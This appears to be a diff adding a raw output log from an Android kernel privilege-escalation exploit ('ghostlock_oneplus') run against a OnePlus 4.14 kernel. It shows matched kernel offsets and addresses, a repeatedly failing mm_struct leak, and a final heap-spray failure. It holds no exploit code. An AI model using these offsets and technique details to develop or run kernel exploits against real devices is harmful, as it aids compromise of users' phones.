@@ -1,0 +1,77 @@
+[33m[*] [0mkernel: 4.14.186-g844fd19c6
+[32m[+] [0moffsets matched: 4.14.186-g844fd19c6
+[32m[+] [0mstartup context pid=29058 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=29058 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=29058 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=29058 phys_offset=0000000040000000 kernel_phys_load=0000000040080000 delta=0000000000080000 slide_logger=ffffff8001cd1500 bootid_data=ffffff8002122670 init_task=ffffff8001cdbec0 root_tg=ffffff8001ccdb78 sysctl_bootid=ffffff8002122670
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 1/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 2/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 3/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 4/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 5/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 6/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 7/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 8/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 9/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 10/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 11/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 12/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 13/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 14/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 15/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 16/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 17/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 18/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 19/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 20/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 21/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page retry 22/24
+[33m[*] [0mGK30: mm_struct_sz=0x380 (offset table=0x500) objs_per_slab=36
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[31m[-] [0mprepare_kernel_page timeout after 23 attempts
+[31m[!] [0mDIAG=8: heap spray failed, cannot build fake lock
